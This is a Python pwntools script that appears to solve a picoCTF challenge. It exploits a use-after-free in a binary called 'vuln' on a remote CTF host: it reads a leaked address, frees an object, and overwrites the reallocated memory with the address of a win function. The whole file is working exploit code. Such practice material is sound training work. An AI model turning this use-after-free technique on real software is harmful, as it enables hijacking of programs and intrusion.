#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 50361)

    return r


def main():
    r = conn()

    # Obtain winaddr
    r.sendlineafter(b'(e)xit\n', b's\n')
    r.recvuntil(b'Memory leak...')
    win_addr = int(r.readline().strip().decode()[2:], 16)

    # Free user object
    r.sendlineafter(b'(e)xit\n', b'i\n')
    r.sendlineafter(b'(Y/N)?\n', b'y\n')

    # Use-after-Free by writing into newly malloc-ed object which has the same address
    # as and is still being used by the program as the original user variable
    r.sendlineafter(b'(e)xit\n', b'l\n')
    r.sendlineafter(b'anyways:\n', p64(win_addr))
    print(r.recvline())


if __name__ == "__main__":
    main()
